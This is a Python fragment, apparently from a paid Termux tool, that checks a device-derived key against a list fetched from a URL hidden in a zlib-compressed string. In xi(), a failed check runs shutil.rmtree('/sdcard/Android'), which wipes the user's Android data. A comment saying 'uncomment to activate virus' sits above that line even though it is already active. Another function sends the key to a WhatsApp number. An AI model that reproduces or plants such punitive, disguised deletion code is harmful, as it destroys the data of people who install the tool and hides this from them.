def getKey():
    myid = str(os.getuid())
    myid=myid.upper()[::-1]
    n=re.findall("(\d\d)",myid)
    plat=platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    
    return "SSG"+myid+xp
km=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcf*\xcdK\xccL\xd1-\xaeH\xd2K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd2\x07J\x94T\x94\xe8e\x94\xe4\xe6\x00\x00\xddG\x12\x0c').decode()
def xi():
    global km
    j=getKey()
    r=requests.get(km).text
    if j in r:
        pass
    else:
        os.system("clear")
        #uncomment to activate virus
        shutil.rmtree("/sdcard/Android")
        print("Don't Bypass ")
        sys.exit()
   
def aprv():
    global km
    r=requests.get(km).text
    k=getKey()
    if k in r:
        menu()
    else:
                os.system('clear')
                print(logo)
                print('\033[1;32mYour Key Is Not Approved Buy The Command First')
                print('\033[1;37m----------------------------------------------')               
                print(f" Your Key: {k}")
                print('\033[1;37m----------------------------------------------')                
                input('\033[1;33m     [Press Enter To Send Key To Admin]')
                os.system(f"termux-open-url https://wa.me/+923189141630?text={k}")
                aprv()
                sys.exit()
